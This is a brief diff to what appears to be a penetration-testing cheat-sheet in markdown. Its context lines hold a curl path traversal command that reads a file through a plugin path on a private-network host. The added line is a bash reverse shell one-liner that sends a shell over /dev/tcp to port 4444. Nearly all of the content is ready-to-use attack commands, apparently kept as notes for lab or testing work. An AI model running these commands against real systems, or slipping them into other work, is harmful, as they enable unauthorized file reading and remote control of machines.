@@ -164,3 +164,5 @@ ajaxRequest.send(params);
 ```
 
 quick note: windows path traversal: ```curl --path-as-is http://192.168.205.193:3000/public/plugins/mysql/../../../../../../../../users/install.txt```
+
+- Bash reverse shell one-liner: ```bash -i >& /dev/tcp/<target IP>/4444 0>&1```
